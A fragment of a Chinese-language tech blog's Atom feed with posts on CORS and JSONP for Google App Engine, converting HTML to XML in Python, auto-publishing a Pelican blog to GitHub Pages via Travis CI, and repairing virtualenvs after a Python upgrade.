&lt;li&gt;&lt;a href="http://blog.blakesimpson.co.uk/read/64-apache-configure-cors-headers-for-whitelist-domains"&gt;Apache Configure CORS Headers for Whitelist Domains&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;似乎是回一個寫死 domain 的 &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; 的 HTTP Header，&lt;br /&gt;
但是可以在設定檔裏面做設定，&lt;br /&gt;
如果 request 是來自允許的 domain 的話，&lt;br /&gt;
就把 &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; 的值設定成該 domain，&lt;br /&gt;
如果不在白名單裡面的話當然就擋掉。  &lt;/p&gt;
&lt;p&gt;Google App Engine 這邊也只能幫忙加上 header，&lt;br /&gt;
如果 Google App Engine 的使用者想針對這部份做進一步的設定的話，&lt;br /&gt;
我目前的想法是只能用 Flexiable Environment，&lt;br /&gt;
前面架個 Apache 或 Nginx 來解掉這問題，&lt;br /&gt;
但我還沒試過就是，&lt;br /&gt;
因為後來又有其他事情得做，&lt;br /&gt;
所以這個 CDN 就暫時開發到這邊而已。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Postscript&lt;/h2&gt;
&lt;p&gt;弄這個 CDN 大約是6月底的事，&lt;br /&gt;
所以算來也差不多兩個月了，&lt;br /&gt;
直到最近又遇到了一次 CORS 的問題。  &lt;/p&gt;
&lt;p&gt;主要是公司有些功能想要實作，&lt;br /&gt;
會需要在客戶的網站上呼叫我們自家公司的 API，&lt;br /&gt;
同事嘗試了以後就遇到 CORS 的問題然後跑來問我。&lt;br /&gt;
因為 API 也是跑在 Google App Engine，&lt;br /&gt;
所以我第一時間就想到在該 API 的 url handler 加上 http_headers。&lt;br /&gt;
但加上去以後用 &lt;code&gt;appcfg.py&lt;/code&gt; 要 deploy 的時候遇到了下面這個錯誤，  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;appcfg.py: error: Error parsing ./app.yaml: Unexpected attribute &amp;quot;http_headers&amp;quot; for mapping type script.  
  in &amp;quot;./app.yaml&amp;quot;, line 70, column 1.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看來 Google App Engine 不允許對非 static files 的 handler 加上 HTTP Headers，&lt;br /&gt;
於是只好另尋出路。  &lt;/p&gt;
&lt;p&gt;想了一下，&lt;br /&gt;
依稀記得之前在處理這個問題的時候好像有看到 JSONP 可以跳過一些跨域名請求的限制，&lt;br /&gt;
於是找到了這篇 &lt;a href="https://stackoverflow.com/questions/28359730/google-place-api-no-access-control-allow-origin-header-is-present-on-the-req"&gt;javascript - Google Place API - No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'null' is therefore not allowed access - Stack Overflow&lt;/a&gt;&lt;br /&gt;
底下有一個回應給出了解答，&lt;br /&gt;
可以透過 jQuery 的 &lt;code&gt;$.ajax()&lt;/code&gt; 跳過 CORS 的限制，&lt;br /&gt;
直接拿到 Cross-Domain 的 JSON API 的結果。  &lt;/p&gt;
&lt;p&gt;作法如下：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ajax&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;  
    &lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;$url_of_api&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nx"&gt;type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nx"&gt;dataType&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jsonp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nx"&gt;cache&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="nx"&gt;success&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;  
        &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="p"&gt;}&lt;/span&gt;  
&lt;span class="p"&gt;});&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中把 &lt;code&gt;$url_of_api&lt;/code&gt; 換成會回傳 JSON 結果的 Cross-Domain API 的網址就行了，&lt;br /&gt;
我把這個事件叫作「JSONP 拯救 Cross-Domain JSON API Request」。(啥  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Access-Control-Allow-Origin"&gt;HTTP access control (CORS) - HTTP | MDN&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/storage/docs/cross-origin#client_side_support"&gt;Cross-Origin Resource Sharing (CORS) | Cloud Storage | Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/17555269/access-control-allow-origin-header-on-google-app-engine"&gt;python - Access-Control-Allow-Origin header on Google App Engine - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.w3.org/TR/cors/"&gt;Cross-Origin Resource Sharing&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://rustyrazorblade.com/2013/10/cors-with-wildcard-subdomains-using-nginx/"&gt;CORS with Wildcard Subdomains Using Nginx — Rustyrazorblade&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.blakesimpson.co.uk/read/64-apache-configure-cors-headers-for-whitelist-domains"&gt;Apache Configure CORS Headers for Whitelist Domains&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/config/appref"&gt;app.yaml Reference | App Engine standard environment for Python | Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/28359730/google-place-api-no-access-control-allow-origin-header-is-present-on-the-req"&gt;javascript - Google Place API - No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'null' is therefore not allowed access - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="W3C"></category><category term="HTTP"></category><category term="CORS"></category><category term="Cross-Origin HTTP Request"></category><category term="Google App Engine"></category></entry><entry><title>Convert HTML string to XML string with Python</title><link href="https://blog.m157q.tw/posts/2016/08/28/convert-html-string-to-xml-string-with-python/" rel="alternate"></link><published>2016-08-28T00:47:20+08:00</published><updated>2016-08-28T00:47:20+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-08-28:posts/2016/08/28/convert-html-string-to-xml-string-with-python/</id><summary type="html">&lt;h2&gt;Python 2&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;HTMLParser&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HTMLParser&lt;/span&gt;  
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;xml.sax.saxutils&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;  

&lt;span class="n"&gt;xml_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HTMLParser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;html_str&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Python 3&lt;/h2&gt;
&lt;h3&gt;Python 3.3 or older&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;html.parser&lt;/span&gt; &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HTMLParser&lt;/span&gt;  
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;xml.sax.saxutils&lt;/span&gt; &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;  

&lt;span class="n"&gt;xml_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HTMLParser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;html_str&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Pytho 3.4+&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;html&lt;/span&gt;  
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;xml.sax.saxutils&lt;/span&gt; &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;  

&lt;span class="n"&gt;xml_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unescape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;html_str&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h1&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/2360598/how-do-i-unescape-html-entities-in-a-string-in-python-3-1"&gt;How do I unescape HTML entities in a string in Python 3.1? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Python 2"></category><category term="Python 3"></category><category term="HTML"></category><category term="XML"></category></entry><entry><title>用 Travis CI 自動化發佈 Pelican blog 到 GitHub Pages 上</title><link href="https://blog.m157q.tw/posts/2016/05/08/use-travis-ci-to-publish-pelican-blog-on-github-pages-automatically/" rel="alternate"></link><published>2016-05-08T13:00:07+08:00</published><updated>2016-05-08T13:00:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-05-08:posts/2016/05/08/use-travis-ci-to-publish-pelican-blog-on-github-pages-automatically/</id><summary type="html">&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;主要的設定都是參考這篇：&lt;a href="http://blog.mathieu-leplatre.info/publish-your-pelican-blog-on-github-pages-via-travis-ci.html"&gt;Publish your Pelican blog on Github pages via Travis-CI&lt;/a&gt;&lt;br /&gt;
不過因為這篇寫於 2014 年的 1 月，&lt;br /&gt;
有些內容已經有點過時了，跟我實際操作起來上有些差異，&lt;br /&gt;
我有在底下留言給作者了，我自己這邊也順便紀錄一下作法。  &lt;/p&gt;
&lt;p&gt;先把最終的設定檔放上來好了  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/blob/source/.travis.yml"&gt;.travis.yml&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/blob/source/requirements.txt"&gt;requirements.txt&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/blob/source/Makefile"&gt;Makefile&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;作法&lt;/h1&gt;
&lt;p&gt;先到 &lt;code&gt;https://travis-ci.org/profile/${your_github_username}&lt;/code&gt; switch on 該 repo  &lt;/p&gt;
&lt;h2&gt;設定 &lt;code&gt;.travis.yml&lt;/code&gt;&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;language&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;python&lt;/span&gt;  
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;python&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;2.7&amp;#39;&lt;/span&gt;  &lt;span class="c1"&gt;# Pelican 已支援 Python 3，只是我用到一些 Plugins 仍然只能用 Python 2  &lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;branches&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;only&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
  &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;source&lt;/span&gt;  &lt;span class="c1"&gt;# 我是把 Pelican 的原始文字檔放在 source 這個 branch  &lt;/span&gt;
            &lt;span class="c1"&gt;# 如果是一般的 project 應該就是用 master branch  &lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;install&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;pip install -r requirements.txt&lt;/span&gt;  &lt;span class="c1"&gt;# 這邊其實可以直接寫死 pip install ${package}  &lt;/span&gt;
                                   &lt;span class="c1"&gt;# 使用 requirements.txt 純粹是我個人喜好  &lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;script&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;make travis&lt;/span&gt;  &lt;span class="c1"&gt;# 需要在 Makefile 新增 travis 的 label  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;扣掉空行也不過就 10 行  &lt;/p&gt;
&lt;h2&gt;設定 &lt;code&gt;requirements.txt&lt;/code&gt;&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pelican==3.6.3  
markdown==2.6.6       # 因為我用 Markdown 而不是 reStructuredText 寫 blog  
ghp-import==0.4.1     # 讓你 git add 某個資料夾的內容並將其 commit 到另外一個 branch  
beautifulsoup4==4.4.1 # 我用到的 plugin 需要  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;設定 &lt;code&gt;Makefile&lt;/code&gt;&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;OUTPUTDIR&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;BASEDIR&lt;span class="k"&gt;)&lt;/span&gt;/output  
&lt;span class="nv"&gt;GITHUB_REPO_SLUG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;M157q/m157q.github.io  
&lt;span class="nv"&gt;GITHUB_REMOTE_NAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;origin  
&lt;span class="nv"&gt;GITHUB_PAGES_BRANCH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;master  
&lt;span class="c"&gt;# 以上參數請根據需求自行替換  &lt;/span&gt;
&lt;span class="nv"&gt;GITHUB_COMMIT_MSG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;shell git --no-pager log --format&lt;span class="o"&gt;=&lt;/span&gt;%s -n &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;  

&lt;span class="nf"&gt;travis&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;publish&lt;/span&gt;  
&lt;span class="c"&gt;    # 為 Travis CI 設定 git 的 user.name 和 user.email  &lt;/span&gt;
&lt;span class="c"&gt;    # 沒設定 email 的話，GitHub 上面看到的 Author 會是 Unknown  &lt;/span&gt;
    git config --global user.name &lt;span class="s2"&gt;&amp;quot;M157q - Travis&amp;quot;&lt;/span&gt;  
    git config --global user.email M157q.tw@gmail.com  

&lt;span class="c"&gt;    # 將 Pelican output dir 的內容 commit 到 GitHub Pages 用的 branch，準備 push 上去  &lt;/span&gt;
&lt;span class="c"&gt;    # 因為我用的是 user site，所以 branch 是 master。如果是 project site 的話，branch 會是 gh-pages  &lt;/span&gt;
    ghp-import -n -r &lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_REMOTE_NAME&lt;span class="k"&gt;)&lt;/span&gt; -b &lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_PAGES_BRANCH&lt;span class="k"&gt;)&lt;/span&gt; -m &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_COMMIT_MSG&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;OUTPUTDIR&lt;span class="k"&gt;)&lt;/span&gt;  

&lt;span class="c"&gt;    # 將剛剛的 commit force push 到 GitHub 上相同的 branch  &lt;/span&gt;
&lt;span class="c"&gt;    # 不用 -f (force push) 的話一定會因為 conflict 而失敗  &lt;/span&gt;
&lt;span class="c"&gt;    # 因為每次 Travis CI build 只會有一個 commit  &lt;/span&gt;
&lt;span class="c"&gt;    # 而且該 branch 只會存一堆靜態檔案，每次變動都很大，沒有啥需要保存 commit log 的必要性。  &lt;/span&gt;
    @git push -fq https://&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;GH_TOKEN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;@github.com/&lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_REPO_SLUG&lt;span class="k"&gt;)&lt;/span&gt;.git &lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_PAGES_BRANCH&lt;span class="k"&gt;)&lt;/span&gt;:&lt;span class="k"&gt;$(&lt;/span&gt;GITHUB_PAGES_BRANCH&lt;span class="k"&gt;)&lt;/span&gt; &amp;gt; /dev/null  
&lt;span class="c"&gt;    # 用 @ 可以讓 Travis CI 不要顯示這行在 log 上，這樣別人就不會看到你的 GitHub Personal Access Token 了，也就是這裡用的 ${GH_TOKEN}  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;設定 &lt;code&gt;GH_TOKEN&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;先到 &lt;a href="https://github.com/settings/tokens"&gt;https://github.com/settings/tokens&lt;/a&gt; 點選右上方的 &lt;code&gt;Generate new token&lt;/code&gt;&lt;br /&gt;
GitHub 可能會要求輸入密碼，確定現在是本人使用，然後進入 sudo mode。&lt;br /&gt;
填寫 Token description 描述一下這是 Travis CI 要拿來 build Pelican blog 用的，&lt;br /&gt;
主要是給自己看的，怕之後忘記。&lt;br /&gt;
然後 select scopes 就點選 repo 就夠了&lt;br /&gt;
直接移到底下點選 Generate token&lt;br /&gt;
之後就會有一組 GitHub Personal Access Token 可以複製了&lt;br /&gt;
然後我們要將這個 Token 的權限綁到 Travis CI 上，&lt;br /&gt;
讓 Travis CI 有權限將 commit push 到 repo&lt;br /&gt;
這邊有兩種作法，&lt;br /&gt;
一種是直接在 Travis CI 的 Web 介面上設定環境變數（比較簡單），&lt;br /&gt;
另一種是寫在 &lt;code&gt;.travis.yml&lt;/code&gt; 裡頭，但有先透過 travis 將 token 進行加密，&lt;br /&gt;
所以不會在 &lt;code&gt;.travis.yml&lt;/code&gt; 就洩漏 GitHub Personal Access Token（但要輸入一些指令，比較麻煩一點）&lt;br /&gt;
兩種擇一即可，我原本是用 CLI 設定，後來改用 Web Interface 設定。  &lt;/p&gt;
&lt;h3&gt;透過 Travis CI Web Interface 設定&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;到 &lt;code&gt;https://travis-ci.org/${user_name}/${repo_name}&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;移到右手邊的 more options 並點選 settings  &lt;/li&gt;
&lt;li&gt;底下有個 Environment Variables，有 Name 和 Value 兩個欄位  &lt;ul&gt;
&lt;li&gt;在 Name 欄位填上 &lt;code&gt;GH_TOKEN&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;在 Value 欄位貼上剛剛複製的 Token  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;然後點選 Add 即可  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;透過 Travis CI CLI 設定&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;首先必須確認有安裝 &lt;code&gt;travis&lt;/code&gt; 的 CLI tool  &lt;/li&gt;
&lt;li&gt;之後在 terminal 輸入 &lt;code&gt;travis encrypt GH_TOKEN=${your_token} --add&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;就會看到 &lt;code&gt;.travis.yml&lt;/code&gt; 裡頭多了一個 block 顯示類似下面的內容  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;env&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
  &lt;span class="n"&gt;global&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  
    &lt;span class="n"&gt;secure&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;xxxxxxxxxx&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;這樣就行了，之後每次 Travis CI 在跑的時候都會把這串值拿去 decode 並解密成原本的 token。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;讓 Travis CI 不要在有 PR 的時候重新產生 blog&lt;/h2&gt;
&lt;p&gt;到 &lt;code&gt;https://travis-ci.org/${user_name}/${repo_name}/settings&lt;/code&gt;，&lt;br /&gt;
把 &lt;code&gt;Build pull requests&lt;/code&gt; 那個 switch 切換成 off  &lt;/p&gt;
&lt;h2&gt;測試有沒有成功&lt;/h2&gt;
&lt;p&gt;都設定完的話，&lt;br /&gt;
之後只要把新的 commit push 到 GitHub 上，&lt;br /&gt;
Travis CI 就會自動 build blog 啦~  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Reference&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.mathieu-leplatre.info/publish-your-pelican-blog-on-github-pages-via-travis-ci.html"&gt;Publish your Pelican blog on Github pages via Travis-CI&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Pelican"></category><category term="Travis CI"></category><category term="GitHub Pages"></category><category term="Blog"></category></entry><entry><title>Fix virtualenv after an upgrade of Python</title><link href="https://blog.m157q.tw/posts/2015/10/07/fix-virtualenv-after-an-upgrade-of-python/" rel="alternate"></link><published>2017-01-16T22:29:41+08:00</published><updated>2017-01-16T22:29:41+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-10-07:posts/2015/10/07/fix-virtualenv-after-an-upgrade-of-python/</id><summary type="html">&lt;h2&gt;Manual&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/.virtualenvs  
$ find &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;envname&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/ -type l -delete  
$ virtualenv &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;envname&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Script for one virtualenv&lt;/h2&gt;
&lt;p&gt;Here's a tiny script from &lt;a href="https://gist.github.com/tevino/1a557a0c200d61d4e4fb"&gt;Fix python virtualenv after python update · GitHub&lt;/a&gt; for doing this.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;fix_virtualenv.sh  
---  
&lt;span class="c1"&gt;#!/usr/bin/env bash  &lt;/span&gt;
&lt;span class="nv"&gt;ENV_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;dirname &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;dirname &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;which pip&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
&lt;span class="nv"&gt;SYSTEM_VIRTUALENV&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;which -a virtualenv&lt;span class="p"&gt;|&lt;/span&gt;tail -1&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Ensure the root of current virtualenv:&amp;quot;&lt;/span&gt;  
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;    &lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
&lt;span class="nb"&gt;read&lt;/span&gt; -p &lt;span class="s2"&gt;&amp;quot;‼️  Say no if you are not sure (y/N) &amp;quot;&lt;/span&gt; -n &lt;span class="m"&gt;1&lt;/span&gt; -r  
&lt;span class="nb"&gt;echo&lt;/span&gt;  
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[[&lt;/span&gt; &lt;span class="nv"&gt;$REPLY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;~ ^&lt;span class="o"&gt;[&lt;/span&gt;Yy&lt;span class="o"&gt;]&lt;/span&gt;$ &lt;span class="o"&gt;]]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;♻️  Removing old symbolic links......&amp;quot;&lt;/span&gt;  
    find &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -type l -delete -print  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;💫  Creating new symbolic links......&amp;quot;&lt;/span&gt;  
    &lt;span class="nv"&gt;$SYSTEM_VIRTUALENV&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ENV_PATH&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;  
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;🎉  Done!&amp;quot;&lt;/span&gt;  
&lt;span class="k"&gt;fi&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Steps&lt;/h3&gt;
